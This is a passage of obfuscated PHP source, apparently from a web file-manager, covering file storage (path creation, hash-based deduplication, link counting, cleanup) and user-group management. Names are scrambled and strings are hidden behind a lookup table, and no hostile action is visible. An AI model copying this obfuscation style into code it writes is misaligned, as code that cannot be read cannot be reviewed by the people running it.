$ß­˜åíÚ[1903] . md5($õ¤ˆ²Ñ); if (!$ÜôÏËü && !Cache::get($ÑµíÏÅ)) { $ÜôÏËü = !0; $¾¼å˜…³ = IO::mkdir($õ¤ˆ²Ñ); if (!IO::exist($¾¼å˜…³ . $ß­˜åíÚ[817])) { IO::mkfile($¾¼å˜…³ . $ß­˜åíÚ[817]); } Cache::set($ÑµíÏÅ, 1, 3600 * 2); } return $Šİ¯‹çñ; } public function makeFilePath($Ö§Æ’òô, $Œ—‹¥íû, $œÌ‹êó² = false, $ƒ­‡É´Ò = false) { $ãÅ¯Î¾ =& $_SERVER[¡“ËÌ§œ]; $¬ šºåç = Model($ãÅ¯Î¾[790])->get($ãÅ¯Î¾[1904]); $õ·÷ì†“ = KodIO::defaultIO() . date($ãÅ¯Î¾[1905]); $ñ²åÒŸ = $õ·÷ì†“ . rand_string(5) . short_id(100); $Ö§Æ’òô = str_replace($ãÅ¯Î¾[8], $ãÅ¯Î¾[11], KodIO::clear($Ö§Æ’òô)); $îÂ§Âù‹ = $Œ—‹¥íû->ext($Ö§Æ’òô); if (!$Ö§Æ’òô) { $¬ šºåç = $ãÅ¯Î¾[1906]; } switch ($¬ šºåç) { case $ãÅ¯Î¾[1907]: $ñ²åÒŸ = $ñ²åÒŸ . $ãÅ¯Î¾[10] . $Œ—‹¥íû->ext($Ö§Æ’òô); if ($îÂ§Âù‹ == $ãÅ¯Î¾[1844]) { $ñ²åÒŸ .= $ãÅ¯Î¾[1226]; } break; case $ãÅ¯Î¾[1908]: $©¥±ƒèø = Model($ãÅ¯Î¾[790])->get($ãÅ¯Î¾[791]); $ä—ğÉå = substr(md5($ãÅ¯Î¾[792] . $©¥±ƒèø . date($ãÅ¯Î¾[768])), 0, 8); $½ûÛ›Ú = KodIO::defaultDriver(); $õ·÷ì†“ = $ãÅ¯Î¾[1257] . $½ûÛ›Ú[$ãÅ¯Î¾[437]] . $ãÅ¯Î¾[447] . date($ãÅ¯Î¾[1909]) . $ä—ğÉå . $ãÅ¯Î¾[8]; if ($îÂ§Âù‹ == $ãÅ¯Î¾[1844]) { $Ö§Æ’òô .= $ãÅ¯Î¾[1226]; } $ñšæì = $ãÅ¯Î¾[1910] . $õ·÷ì†“ . $Ö§Æ’òô; CacheLock::lock($ñšæì); $ñ²åÒŸ = $õ·÷ì†“ . $Ö§Æ’òô; if (IO::exist($õ·÷ì†“ . $Ö§Æ’òô)) { $¼ôõˆ…Í = substr($Ö§Æ’òô, 0, strlen($Ö§Æ’òô) - strlen($îÂ§Âù‹)); $ºò‘®ù  = $ƒ­‡É´Ò ? substr($ƒ­‡É´Ò, 0, 5) : ($œÌ‹êó² ? substr($œÌ‹êó², 0, 5) : rand_string(5)); $ñ²åÒŸ = $õ·÷ì†“ . $¼ôõˆ…Í . $ºò‘®ù  . $ãÅ¯Î¾[10] . $îÂ§Âù‹; } if (IO::isTypeObject($ñ²åÒŸ) && !IO::isUploadServer($ñ²åÒŸ)) { if (IO::exist($ñ²åÒŸ)) { return $ñ²åÒŸ; } $òÖ×±Ûı = IO::setContent($ñ²åÒŸ, $ãÅ¯Î¾[12]); if (!$òÖ×±Ûı) { show_json($ãÅ¯Î¾[1911], !1); } } CacheLock::unlock($ñšæì); break; case $ãÅ¯Î¾[1906]: break; default: break; } return $ñ²åÒŸ; } public function addFileByRemote($Êûš‹Ó, $“ûº‰Ã‰, $õ»„—¸„ = array()) { $¼Ãæ£ÙÃ =& $_SERVER[¡“ËÌ§œ]; if (!IO::exist($Êûš‹Ó)) { return !1; } $ñÆ›êÍ× = $õ»„—¸„[$¼Ãæ£ÙÃ[176]] ? $õ»„—¸„[$¼Ãæ£ÙÃ[176]] : $¼Ãæ£ÙÃ[12]; $…ˆì– = IO::hashMd5($Êûš‹Ó, $ñÆ›êÍ×); $§øµ©ÔÁ = KodIO::defaultDriver(); $õú—§Ş = array($¼Ãæ£ÙÃ[583] => IO::size($Êûš‹Ó), $¼Ãæ£ÙÃ[1912] => 1, $¼Ãæ£ÙÃ[458] => $“ûº‰Ã‰, $¼Ãæ£ÙÃ[828] => $§øµ©ÔÁ[$¼Ãæ£ÙÃ[437]], $¼Ãæ£ÙÃ[459] => $Êûš‹Ó, $¼Ãæ£ÙÃ[1913] => $õ»„—¸„[$¼Ãæ£ÙÃ[177]] ? $õ»„—¸„[$¼Ãæ£ÙÃ[177]] : IO::hashSimple($Êûš‹Ó), $¼Ãæ£ÙÃ[1914] => $…ˆì– ? $…ˆì– : $ñÆ›êÍ×); if ($Î€„±‰Ğ = $this->addFileCheckExist($õú—§Ş[$¼Ãæ£ÙÃ[177]], $õú—§Ş[$¼Ãæ£ÙÃ[176]], $õú—§Ş[$¼Ãæ£ÙÃ[76]])) { return $Î€„±‰Ğ; } return $this->addFileData($õú—§Ş); } private function addFileData($©îÉ‡çÂ) { $‹²¨§® =& $_SERVER[¡“ËÌ§œ]; if (!$©îÉ‡çÂ) { return !1; } $©îÉ‡çÂ[$‹²¨§®[76]] = intval($©îÉ‡çÂ[$‹²¨§®[76]]); if (!$©îÉ‡çÂ[$‹²¨§®[76]] && strlen($©îÉ‡çÂ[$‹²¨§®[177]]) > 32) { $©îÉ‡çÂ[$‹²¨§®[76]] = intval(substr($©îÉ‡çÂ[$‹²¨§®[177]], 32)); } $ÆËéÆ¤ë = $this->add($©îÉ‡çÂ); return $this->find($ÆËéÆ¤ë); } public function addFile($‚Ñ˜ÀÆ, $“ª‘ú©ã, $íŒÀĞÀ— = false) { $ê”™Èí =& $_SERVER[¡“ËÌ§œ]; $¥ô¹Àç = IO::hashSimple($‚Ñ˜ÀÆ); $ÍÑµÖË = IO::size($‚Ñ˜ÀÆ); $ßúûí¢î = $ÍÑµÖË <= 1024 * 1024 * 10 ? IO::hashMd5($‚Ñ˜ÀÆ) : $ê”™Èí[12]; $®ÜÇòÔ± = $ê”™Èí[1915] . $¥ô¹Àç; CacheLock::lock($®ÜÇòÔ±); if ($ßúûí¢î && $¥ô¹Àç) { $åøªêõ = $this->addFileCheckExist($¥ô¹Àç, $ßúûí¢î, $ÍÑµÖË); if ($åøªêõ) { CacheLock::unlock($®ÜÇòÔ±); return $åøªêõ; } } $–€ì­¢ = $this->addFileMake($‚Ñ˜ÀÆ, $ÍÑµÖË, $¥ô¹Àç, $ßúûí¢î, $“ª‘ú©ã, $íŒÀĞÀ—); $­–´Çè = $this->addFileData($–€ì­¢); CacheLock::unlock($®ÜÇòÔ±); if (!$ßúûí¢î && $­–´Çè) { $this->fileMd5Check($­–´Çè); } return $­–´Çè; } private function fileMd5Check($«ê¸´Ÿä) { $µÒÊ¿€¿ =& $_SERVER[¡“ËÌ§œ]; $‰Œ¼†À¸ = array($«ê¸´Ÿä[$µÒÊ¿€¿[506]], $«ê¸´Ÿä[$µÒÊ¿€¿[84]]); $¡½ÍêÒğ = $µÒÊ¿€¿[1916] . $«ê¸´Ÿä[$µÒÊ¿€¿[84]]; $›†‡ù™ = $µÒÊ¿€¿[1917] . $«ê¸´Ÿä[$µÒÊ¿€¿[506]]; $•˜¶–º¸ = TaskQueue::add($µÒÊ¿€¿[1918], $‰Œ¼†À¸, $¡½ÍêÒğ, $›†‡ù™); if (!$•˜¶–º¸) { $this->fileMd5Set($«ê¸´Ÿä[$µÒÊ¿€¿[506]], $«ê¸´Ÿä[$µÒÊ¿€¿[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($’¢æı§›, $ÕÃú”€) { $ñ¢úäŠ =& $_SERVER[¡“ËÌ§œ]; $¾œ®âşß = $this->find($’¢æı§›); if (!$¾œ®âşß || $¾œ®âşß[$ñ¢úäŠ[176]]) { return; } $²ÂÇ”Óê = IO::hashMd5($ÕÃú”€); if (!$²ÂÇ”Óê) { return $ñ¢úäŠ[12]; } $this->where(array($ñ¢úäŠ[506] => $’¢æı§›))->save(array($ñ¢úäŠ[176] => $²ÂÇ”Óê)); } public function addFileMake($¼¥Ä¨Ò, $†‰ØØÉ², $ıÊ˜±“‘, $Å°ÍÇ±Ÿ, $ş•Œ‹Ğ¼, $µºì±—) { $»ÉİÓ³µ =& $_SERVER[¡“ËÌ§œ]; $¨¥ò©œ = $this->createFileName($ş•Œ‹Ğ¼, $ıÊ˜±“‘, $Å°ÍÇ±Ÿ); $äé°•×ô = get_path_father($¨¥ò©œ); $Ç«”®ïæ = get_path_this($¨¥ò©œ); if ($µºì±—) { $«ï‹°Ç = IO::move($¼¥Ä¨Ò, $äé°•×ô, !1, $Ç«”®ïæ); } else { $«ï‹°Ç = IO::copy($¼¥Ä¨Ò, $äé°•×ô, !1, $Ç«”®ïæ); } if (!$«ï‹°Ç) { return !1; } $ÛêıùšĞ = KodIO::defaultDriver(); $ÓÖÏ•ˆÃ = array($»ÉİÓ³µ[583] => $†‰ØØÉ², $»ÉİÓ³µ[1912] => 1, $»ÉİÓ³µ[458] => $ş•Œ‹Ğ¼, $»ÉİÓ³µ[828] => $ÛêıùšĞ[$»ÉİÓ³µ[437]], $»ÉİÓ³µ[459] => $¨¥ò©œ, $»ÉİÓ³µ[1913] => $ıÊ˜±“‘, $»ÉİÓ³µ[1914] => $Å°ÍÇ±Ÿ); return $ÓÖÏ•ˆÃ; } public function addFileCheckExist($¸©öö‹¶, $éçÎèøÆ, $Î“¡£ù) { $¦£¼Ó”Ï =& $_SERVER[¡“ËÌ§œ]; $çø”¦Ïƒ = $this->findByHash($¸©öö‹¶, $éçÎèøÆ); if (!$çø”¦Ïƒ) { return !1; } $ì–šöøû = array($¦£¼Ó”Ï[1912] => intval($çø”¦Ïƒ[$¦£¼Ó”Ï[1919]]) + 1, $¦£¼Ó”Ï[583] => $Î“¡£ù); $this->where(array($¦£¼Ó”Ï[507] => $çø”¦Ïƒ[$¦£¼Ó”Ï[506]]))->save($ì–šöøû); return $çø”¦Ïƒ; } public function remove($ˆ¹ƒá½§) { $this->linkCountChange($ˆ¹ƒá½§, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ø½Æ†Ä©) { $this->linkCountChange($Ø½Æ†Ä©, !0); } public function linkCountChange($éÑæ¥Ú«, $è“‚¨·à) { $ˆ²¨ÊÀñ =& $_SERVER[¡“ËÌ§œ]; if (!$éÑæ¥Ú«) { return; } if (!is_array($éÑæ¥Ú«)) { $éÑæ¥Ú« = array($éÑæ¥Ú«); } $Ğïè¯®• = array(); foreach ($éÑæ¥Ú« as $ÔÔ½¹Ôª) { $šÜÓı´‡ = $ÔÔ½¹Ôª . $ˆ²¨ÊÀñ[12]; if (!$Ğïè¯®•[$šÜÓı´‡]) { $Ğïè¯®•[$šÜÓı´‡] = 0; } $Ğïè¯®•[$šÜÓı´‡]++; } $‰éíÒ€ = array(); foreach ($Ğïè¯®• as $ÔÔ½¹Ôª => $˜³ïıäÙ) { $šÜÓı´‡ = $˜³ïıäÙ . $ˆ²¨ÊÀñ[12]; if (!$‰éíÒ€[$šÜÓı´‡]) { $‰éíÒ€[$šÜÓı´‡] = array(); } $‰éíÒ€[$šÜÓı´‡][] = $ÔÔ½¹Ôª; } foreach ($‰éíÒ€ as $˜³ïıäÙ => $¬‚Ä¼ç¨) { if (!$¬‚Ä¼ç¨) { continue; } $˜³ïıäÙ = $è“‚¨·à ? $˜³ïıäÙ : -intval($˜³ïıäÙ); $ÛÒ¨ Í‹ = array($ˆ²¨ÊÀñ[506] => array($ˆ²¨ÊÀñ[7], $¬‚Ä¼ç¨)); if ($˜³ïıäÙ < 0) { $ÛÒ¨ Í‹[$ˆ²¨ÊÀñ[1919]] = array($ˆ²¨ÊÀñ[1035], abs($˜³ïıäÙ)); } $this->where($ÛÒ¨ Í‹)->setAdd($ˆ²¨ÊÀñ[1919], $˜³ïıäÙ); } } public function findByHash($¼«ÏùÅ×, $™« —ÄÕ = false) { $¯‹‚ñü‚ =& $_SERVER[¡“ËÌ§œ]; if (!$¼«ÏùÅ× && !$™« —ÄÕ) { return !1; } $é‚Öœ– = array($¯‹‚ñü‚[1913] => $¼«ÏùÅ×); if ($™« —ÄÕ) { $é‚Öœ– = array($¯‹‚ñü‚[1914] => $™« —ÄÕ); } return $this->order($¯‹‚ñü‚[1920])->where($é‚Öœ–)->find(); } public function clearEmpty($ƒî§¹¤è = 0) { $„§Ó×ğÁ =& $_SERVER[¡“ËÌ§œ]; $ˆÌœ£Ç = time() - 3600 * 24 * $ƒî§¹¤è; $±¼…óî = $„§Ó×ğÁ[1921] . $ˆÌœ£Ç; $©©ıÛà‹ = $this->where($±¼…óî)->select(); if (!$©©ıÛà‹) { return; } $ÃÂÌÈ—¹ = new Task($„§Ó×ğÁ[1922], $„§Ó×ğÁ[12], count($©©ıÛà‹)); foreach ($©©ıÛà‹ as $Ãôß·Ï) { $ÃÂÌÈ—¹->update(1); $this->resetFile($Ãôß·Ï); } $ÃÂÌÈ—¹->end(); } public function resetFile($·âÄªµÍ) { $ãÍéÖŞ =& $_SERVER[¡“ËÌ§œ]; $£ê°ÇÈç = array($ãÍéÖŞ[507] => $·âÄªµÍ[$ãÍéÖŞ[506]]); $Ùõêğ¶² = Model($ãÍéÖŞ[1353])->where($£ê°ÇÈç)->count(); $ãŸ¾ÇŒ = Model($ãÍéÖŞ[1923])->where($£ê°ÇÈç)->count(); $£®†£üô = intval($Ùõêğ¶²) + intval($ãŸ¾ÇŒ); if ($£®†£üô == 0) { IO::remove($·âÄªµÍ[$ãÍéÖŞ[84]]); Model($ãÍéÖŞ[1924])->delete($·âÄªµÍ[$ãÍéÖŞ[506]]); $this->where($£ê°ÇÈç)->delete(); $this->metaSet($·âÄªµÍ[$ãÍéÖŞ[506]], null, null); return; } if ($·âÄªµÍ[$ãÍéÖŞ[1919]] != $£®†£üô) { $this->where($£ê°ÇÈç)->save(array($ãÍéÖŞ[1912] => $£®†£üô)); } } public function storageInfo($ÙÛ½êØƒ = false) { $³µ¸ªû† =& $_SERVER[¡“ËÌ§œ]; $¦‚¡â–§ = $this->count() + 0.0; $±½Á®—¿ = 0; $…í¦«·’ = 1; $”½ŠĞø = 0; $Ï¾‹›¯ = 5000; for ($ñ¤‚… ® = 0; $ñ¤‚… ® < $¦‚¡â–§; $ñ¤‚… ® = $ñ¤‚… ® + $Ï¾‹›¯) { $šõ¥÷—¡ = $this->limit($ñ¤‚… ®, $ñ¤‚… ® + $Ï¾‹›¯)->select(); foreach ($šõ¥÷—¡ as $ëØ•ÛÁ¶) { $…í¦«·’ += $ëØ•ÛÁ¶[$³µ¸ªû†[76]] * $ëØ•ÛÁ¶[$³µ¸ªû†[1919]]; $±½Á®—¿ += $ëØ•ÛÁ¶[$³µ¸ªû†[76]] * ($ëØ•ÛÁ¶[$³µ¸ªû†[1919]] - 1); $”½ŠĞø += $ëØ•ÛÁ¶[$³µ¸ªû†[1919]]; } } $µÛÓ”¶€ = array($³µ¸ªû†[1925] => $…í¦«·’, $³µ¸ªû†[1926] => $±½Á®—¿, $³µ¸ªû†[1927] => $±½Á®—¿ / $…í¦«·’, $³µ¸ªû†[80] => $¦‚¡â–§, $³µ¸ªû†[1928] => $”½ŠĞø); return $µÛÓ”¶€; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\x70"; protected $tableMeta = array("\x74\x61\142\154\x65\116\141\x6d\145" => "\x67\162\157\x75\160\137\x6d\145\164\x61", "\155\145\164\x61\x46\x69\145\x6c\144" => "\147\x72\x6f\x75\160\x49\104"); protected function cacheFunctionAlias($›ˆÖŒ°ú) { $®æàæüº =& $_SERVER[¡“ËÌ§œ]; return array($®æàæüº[1929] => array($›ˆÖŒ°ú[0], $®æàæüº[1930]), $®æàæüº[1931] => array($›ˆÖŒ°ú[0], $®æàæüº[1932])); } protected function getInfo($³­î—‡Ï, $£ŒÂ¶ù˜ = false) { $ÉÔ¿Â  = $this->getInfoSimple($³­î—‡Ï); if (!$ÉÔ¿Â ) { return !1; } if ($£ŒÂ¶ù˜) { return $this->_listDataApplyItem($ÉÔ¿Â ); } return $this->cacheFunctionGet($_SERVER[¡“ËÌ§œ][1933], $³­î—‡Ï); } protected function getInfoSimple($ù½÷Ã½„, $Ó½‚ÎÄ¯ = false) { $Ã€Öæ¢£ =& $_SERVER[¡“ËÌ§œ]; if ($Ó½‚ÎÄ¯) { $¼ªÂëı¦ = array($Ã€Öæ¢£[1851] => intval($ù½÷Ã½„)); $ıÒ·‡Æ„ = $this->where($¼ªÂëı¦)->find(); return is_array($ıÒ·‡Æ„) ? $ıÒ·‡Æ„ : array(); } return $this->cacheFunctionGet($Ã€Öæ¢£[1934], $ù½÷Ã½„); } protected function groupAdd($—çæ¿ƒ) { $ñóƒíúµ =& $_SERVER[¡“ËÌ§œ]; if (!$—çæ¿ƒ[$ñóƒíúµ[470]] && isset($—çæ¿ƒ[$ñóƒíúµ[1851]]) && $—çæ¿ƒ[$ñóƒíúµ[1851]] == 1) { if ($„½“Éªù = $this->getInfoSimple($—çæ¿ƒ[$ñóƒíúµ[1851]], !0)) { return $—çæ¿ƒ[$ñóƒíúµ[1851]]; } } else { $„½“Éªù = $this->getInfoSimple($—çæ¿ƒ[$ñóƒíúµ[470]]); if (!$„½“Éªù) { return !1; } } $¶‚µĞÚ² = $ñóƒíúµ[559]; if ($„½“Éªù[$ñóƒíúµ[549]]) { $¶‚µĞÚ² = $„½“Éªù[$ñóƒíúµ[549]] . $„½“Éªù[$ñóƒíúµ[1851]] . $ñóƒíúµ[50]; } $¦’“¡¤ = array($ñóƒíúµ[458] => $this->groupNameAuto($—çæ¿ƒ[$ñóƒíúµ[470]], $—çæ¿ƒ[$ñóƒíúµ[32]]), $ñóƒíúµ[439] => $—çæ¿ƒ[$ñóƒíúµ[470]], $ñóƒíúµ[618] => $¶‚µĞÚ², $ñóƒíúµ[1935] => $—çæ¿ƒ[$ñóƒíúµ[1838]], $ñóƒíúµ[1936] => 0, $ñóƒíúµ[1855] => 0); if (isset($—çæ¿ƒ[$ñóƒíúµ[1875]])) { $¦’“¡¤[$ñóƒíúµ[1875]] = $—çæ¿ƒ[$ñóƒíúµ[1875]]; } else { $±ÂòÀ—’ = $this->max($ñóƒíúµ[1875]); if (!$±ÂòÀ—’) { $±ÂòÀ—’ = 0; } $¦’“¡¤[$ñóƒíúµ[1875]] = $±ÂòÀ—’ + 1; } if (!empty($—çæ¿ƒ[$ñóƒíúµ[1851]])) { $¦’“¡¤[$ñóƒíúµ[1851]] = $—çæ¿ƒ[$ñóƒíúµ[1851]]; } $ËöÌÁØÎ = $this->add($¦’“¡¤); $this->setNamePinyin($ËöÌÁØÎ, $¦’“¡¤[$ñóƒíúµ[32]]); if (isset($—çæ¿ƒ[$ñóƒíúµ[1937]])) { $this->metaSet($ËöÌÁØÎ, array($ñóƒíúµ[1937] => $—çæ¿ƒ[$ñóƒíúµ[1937]], $ñóƒíúµ[1938] => $—çæ¿ƒ[$ñóƒíúµ[1938]])); unset($—çæ¿ƒ[$ñóƒíúµ[1937]]); unset($—çæ¿ƒ[$ñóƒíúµ[1938]]); } Model($ñóƒíúµ[1353])->groupRootAdd($ËöÌÁØÎ); $this->_clearCache($—çæ¿ƒ[$ñóƒíúµ[470]]); return $ËöÌÁØÎ; } protected function groupEdit($ÜËµ„ş€, $•À…õ) { $ú¢Ïˆçİ =& $_SERVER[¡“ËÌ§œ]; $ëÒ½ÄËå = $this->getInfoSimple($ÜËµ„ş€); if (!$ëÒ½ÄËå) { return !1; } if (!empty($•À…õ[$ú¢Ïˆçİ[470]])) { $¢÷¹ÖËØ = $this->getInfoSimple($•À…õ[$ú¢Ïˆçİ[470]]); if (!$¢÷¹ÖËØ) { return !1; } if ($ëÒ½ÄËå[$ú¢Ïˆçİ[1851]] == $¢÷¹ÖËØ[$ú¢Ïˆçİ[1851]]) { return !1; } if ($•À…õ[$ú¢Ïˆçİ[470]] != $ëÒ½ÄËå[$ú¢Ïˆçİ[470]]) { if ($¢÷¹ÖËØ[$ú¢Ïˆçİ[549]] !== $ëÒ½ÄËå[$ú¢Ïˆçİ[549]] && strpos($¢÷¹ÖËØ[$ú¢Ïˆçİ[549]], $ëÒ½ÄËå[$ú¢Ïˆçİ[549]] . $ëÒ½ÄËå[$ú¢Ïˆçİ[1851]] . $ú¢Ïˆçİ[50]) === 0) { return !1; } $•À…õ[$ú¢Ïˆçİ[618]] = $¢÷¹ÖËØ[$ú¢Ïˆçİ[549]] . $•À…õ[$ú¢Ïˆçİ[470]] . $ú¢Ïˆçİ[50]; $this->_changeChildLevel($ëÒ½ÄËå, $¢÷¹ÖËØ); $this->_clearCache($¢÷¹ÖËØ[$ú¢Ïˆçİ[1851]]); $this->_clearCache($ëÒ½ÄËå[$ú¢Ïˆçİ[470]]); } } if (isset($•À…õ[$ú¢Ïˆçİ[32]])) { $this->setNamePinyin($ÜËµ„ş€, $•À…õ[$ú¢Ïˆçİ[32]]); } if (isset($•À…õ[$ú¢Ïˆçİ[1937]])) { $this->metaSet($ÜËµ„ş€, array($ú¢Ïˆçİ[1937] => $•À…õ[$ú¢Ïˆçİ[1937]], $ú¢Ïˆçİ[1938] => $•À…õ[$ú¢Ïˆçİ[1938]])); unset($•À…õ[$ú¢Ïˆçİ[1937]]); unset($•À…õ[$ú¢Ïˆçİ[1938]]); } $this->_clearChildrenCache($ëÒ½ÄËå); return $this->where(array($ú¢Ïˆçİ[1939] => $ÜËµ„ş€))->save($•À…õ); } private function _clearChildrenCache($Şî„Ä®İ) { $ËºïËÖú =& $_SERVER[¡“ËÌ§œ]; $ôÖ€ ˜ = array($ËºïËÖú[618] => array($ËºïËÖú[578], $Şî„Ä®İ[$ËºïËÖú[549]] . $Şî„Ä®İ[$ËºïËÖú[1851]] . $ËºïËÖú[579])); $Œ©ÉÔˆ = $this->field($ËºïËÖú[1851])->where($ôÖ€ ˜)->select(); foreach ($Œ©ÉÔˆ as $Í»Áß’œ) { $this->_clearCache($Í»Áß’œ[$ËºïËÖú[1851]]); } } private function _clearCache($•òŞ˜³£) { $ã÷ˆ›› =& $_SERVER[¡“ËÌ§œ]; $this->cacheFunctionClear($ã÷ˆ››[1933], $•òŞ˜³£); $this->cacheFunctionClear($ã÷ˆ››[1934], $•òŞ˜³£); } private function _changeChildLevel($Í‰ÄÉË½, $ÎÕâ™î, $«§€‚ãø = false) { $ˆ¡ãË–Ş =& $_SERVER[¡“ËÌ§œ]; $ê£›Óß“ = $Í‰ÄÉË½[$ˆ¡ãË–Ş[549]] . $Í‰ÄÉË½[$ˆ¡ãË–Ş[1851]] . $ˆ¡ãË–Ş[50]; $°çò›àî = $ÎÕâ™î[$ˆ¡ãË–Ş[549]] . $ÎÕâ™î[$ˆ¡ãË–Ş[1851]] . $ˆ¡ãË–Ş[50] . $Í‰ÄÉË½[$ˆ¡ãË–Ş[1851]] . $ˆ¡ãË–Ş[50]; if ($«§€‚ãø) { $°çò›àî = $ÎÕâ™î[$ˆ¡ãË–Ş[549]] . $ÎÕâ™î[$ˆ¡ãË–Ş[1851]] . $ˆ¡ãË–Ş[50]; } $â®Ä¸Ïš = array($ˆ¡ãË–Ş[618] => array($ˆ¡ãË–Ş[578], $Í‰ÄÉË½[$ˆ¡ãË–Ş[549]] . $Í‰ÄÉË½[$ˆ¡ãË–Ş[1851]] . $ˆ¡ãË–Ş[579])); $ä±òÂ³ = array($ˆ¡ãË–Ş[618] => array($ˆ¡ãË–Ş[627], "\x72\145\160\154\x61\143\x65\x28\160\x61\x72\145\x6e\164\114\x65\166\145\x6c\x2c\x27{$ê£›Óß“}\x27\x2c\x27{$°çò›àî}\x27\x29")); $this->_clearChildrenCache($Í‰ÄÉË½); $this->where($â®Ä¸Ïš)->data($ä±òÂ³)->save(); } public function setNamePinyin($Ş×ØÄàœ, $¾¹Æ­à = false) { $€œü©Âñ =& $_SERVER[¡“ËÌ§œ]; if (!$¾¹Æ­à) { $ğÒµú¤à = $this->getInfoSimple($Ş×ØÄàœ); $¾¹Æ­à = $ğÒµú¤à[$€œü©Âñ[32]]; } if (!Input::check($¾¹Æ­à, $€œü©Âñ[621])) { $this->metaSet($Ş×ØÄàœ, $€œü©Âñ[503], null); $this->metaSet($Ş×ØÄàœ, $€œü©Âñ[502], null); return; } $¿ıøéÛí = array($€œü©Âñ[503] => str_replace($€œü©Âñ[53], $€œü©Âñ[12], Pinyin::get($¾¹Æ­à)), $€œü©Âñ[502] => Pinyin::get($¾¹Æ­à, $€œü©Âñ[622])); $this->metaSet($Ş×ØÄàœ, $¿ıøéÛí); } protected function groupStatus($à™Ç”÷İ, $Èµ¨ˆñ±) { $œê¥’‡² =& $_SERVER[¡“ËÌ§œ]; $øÊ¨ç€ê = $this->getInfoSimple($à™Ç”÷İ); if (!$øÊ¨ç€ê) { return !1; } if ($Èµ¨ˆñ± == $œê¥’‡²[88]) { $º¿Ş¥ŠŠ = $this->parentLevelArray($øÊ¨ç€ê[$œê¥’‡²[549]]); } else { $ç¾ù¿òˆ = array($œê¥’‡²[618] => array($œê¥’‡²[578], $øÊ¨ç€ê[$œê¥’‡²[549]] . $øÊ¨ç€ê[$œê¥’‡²[1851]] . $œê¥’‡²[579])); $º¿Ş¥ŠŠ = $this->where($ç¾ù¿òˆ)->field($œê¥’‡²[1851])->select(); $º¿Ş¥ŠŠ = array_to_keyvalue($º¿Ş¥ŠŠ, $œê¥’‡²[12], $œê¥’‡²[1851]); } $º¿Ş¥ŠŠ[] = $øÊ¨ç€ê[$œê¥’‡²[1851]]; $ƒøúÔ†Ü = array(); foreach ($º¿Ş¥ŠŠ as $à™Ç”÷İ) { $ƒøúÔ†Ü[] = array($œê¥’‡²[1851] => $à™Ç”÷İ, $œê¥’‡²[94] => $œê¥’‡²[770], $œê¥’‡²[403] => $Èµ¨ˆñ±); $this->_clearCache($à™Ç”÷İ); } return Model($œê¥’‡²[1940])->addAll($ƒøúÔ†Ü, array(), !0); } protected function groupRemove($Š¦ÚÌö, $Í¥¨Œ = false) { $îŸ«Äœî =& $_SERVER[¡“ËÌ§œ]; $ù‡ Â¸ = array($îŸ«Äœî[1851] => $Š¦ÚÌö); $ƒªÌö·Ã = $this->where($ù‡ Â¸)->find(); if (!$ƒªÌö·Ã || $ƒªÌö·Ã[$îŸ«Äœî[470]] == 0) { return !1; } if (!$Í¥¨Œ) { $üØ²Àßæ = $this->getInfoSimple($ƒªÌö·Ã[$îŸ«Äœî[470]]); $this->_changeChildLevel($ƒªÌö·Ã, $üØ²Àßæ, !0); $this->where(array($îŸ«Äœî[470] => $Š¦ÚÌö))->save(array($îŸ«Äœî[470] => $ƒªÌö·Ã[$îŸ«Äœî[470]])); $this->_clearCache($üØ²Àßæ[$îŸ«Äœî[1851]]); } Model($îŸ«Äœî[1940])->where($ù‡ Â¸)->delete(); Model($îŸ«Äœî[1941])->where($ù‡ Â¸)->delete(); Model($îŸ«Äœî[845])->groupRootRemove($Š¦ÚÌö); $this->_clearCache($ƒªÌö·Ã[$îŸ«Äœî[470]]); return $this->where($ù‡ Â¸)->delete(); } protected function groupSort($Öæ‡Ã¿) { $ìãıºØ =& $_SERVER[¡“ËÌ§œ]; $­…âØâó = array(); foreach ($Öæ‡Ã¿ as $ªû¤ËıÇ => $ÛÂŞ÷ƒÓ) { $­…âØâó[] = array($ìãıºØ[1851], $ÛÂŞ÷ƒÓ, $ìãıºØ[1875], $ªû¤ËıÇ + 1); } $this->saveAll($­…âØâó); } public function listData() { $Ëæ€Ìƒ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ëæ€Ìƒ[$_SERVER[¡“ËÌ§œ][398]]); return $Ëæ€Ìƒ; } private function _makeOrder($ŸØáÊ”â = '') { $äœÜÕà =& $_SERVER[¡“ËÌ§œ]; $ˆ‡Íó–œ = array($äœÜÕà[1851], $äœÜÕà[32], $äœÜÕà[1840], $äœÜÕà[201]); $•Ğû©ï = array($äœÜÕà[488] => $äœÜÕà[489], $äœÜÕà[490] => $äœÜÕà[491]); $ëË¹ı¶ = Input::get($äœÜÕà[495], $äœÜÕà[7], $äœÜÕà[1855], $ˆ‡Íó–œ); $ô€œ³Úƒ = Input::get($äœÜÕà[496], $äœÜÕà[7], $äœÜÕà[1942], array($äœÜÕà[1942], $äœÜÕà[490])); $ô€œ³Úƒ = $•Ğû©ï[$ô€œ³Úƒ]; $ŸØáÊ”â = $ŸØáÊ”â . "{$ëË¹ı¶}\40{$ô€œ³Úƒ}\54\40\x67\162\x6f\165\160\111\x44\40\x61\x73\143"; return $this->order($ŸØáÊ”â); } public function listChild($Ô‘°¿†Ô) { $Ë‘ÇÁÒÊ =& $_SERVER[¡“ËÌ§œ]; $—ğ²î† = $this->where(array($Ë‘ÇÁÒÊ[470] => $Ô‘°¿†Ô))->_makeOrder()->selectPage(200); $this->_listDataApply($—ğ²î†[$Ë‘ÇÁÒÊ[398]]); return $—ğ²î†; } public function listChildIds($¡Ñ¤œïÓ) { $Éì«˜½ =& $_SERVER[¡“ËÌ§œ]; if (is_string($Œöü÷û)) { $¡Ñ¤œïÓ = explode($Éì«˜½[50], $¡Ñ¤œïÓ); } $şßÕ¡‰ş = $this->where(array($Éì«˜½[1851] => array($Éì«˜½[7], $¡Ñ¤œïÓ)))->field($Éì«˜½[1943])->select(); if (!$şßÕ¡‰ş) { return !1; } $›Ñ¸Ò÷ = array(); foreach ($şßÕ¡‰ş as $”Ÿüóôø) { $›Ñ¸Ò÷[] = "\x73\x65\154\145\x63\x74\x20\147\x72\157\165\160\x49\104\x20\x66\x72\157\x6d\x20\140\x67\x72\157\x75\x70\x60\x20\167\x68\145\x72\x65\x20\x70\141\162\x65\156\164\114\145\x76\x65\x6c\x20\154\151\153\x65\40\x27{$”Ÿüóôø[$Éì«˜½[549]]}{$”Ÿüóôø[$Éì«˜½[1851]]}\x2c\45\x27"; } $›Ñ¸Ò÷ 